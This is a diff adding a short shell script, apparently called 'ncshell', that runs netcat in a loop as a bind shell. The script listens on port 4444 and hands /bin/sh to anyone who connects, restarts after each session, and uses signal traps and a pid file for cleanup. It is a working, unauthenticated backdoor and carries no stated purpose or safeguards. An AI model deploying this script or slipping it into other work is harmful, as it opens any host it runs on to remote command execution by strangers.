@@ -1,0 +1,24 @@
+#!/bin/sh
+
+flag=true
+port=4444
+pid_file="/tmp/ncshell.pid"
+
+clean_up() {
+	echo "Terminate nc service."
+	flag=false
+	nc -z localhost $port
+}
+
+trap clean_up SIGHUP
+trap clean_up SIGINT
+trap clean_up SIGTERM
+
+echo "$$" > "$pid_file"
+nc -z localhost $port  # clean previous run
+
+while [ "$flag" = true ]; do
+	nc -l -p $port -e /bin/sh
+done
+
+rm "$pid_file"
